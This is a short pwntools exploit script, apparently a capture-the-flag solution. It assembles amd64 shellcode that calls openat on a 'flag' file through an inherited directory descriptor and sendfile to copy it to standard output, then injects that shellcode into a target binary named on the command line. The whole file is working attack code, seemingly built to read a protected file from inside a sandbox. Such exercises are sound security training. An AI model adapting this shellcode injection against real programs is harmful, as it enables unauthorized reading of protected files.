#!/bin/python

import os
import sys
from pwn import * 

context.arch = 'amd64'
WRITABLE_MEM = 0x1337000 + 0x200
FLAG_LEN = 58

sc_bytes = (shellcraft.openat(3, 'flag', os.O_RDONLY)
          + shellcraft.sendfile(1, 4, 0, FLAG_LEN)
)
asm_code = asm(sc_bytes)


proc = process([sys.argv[1], '/'])
proc.send(asm_code)
proc.interactive()
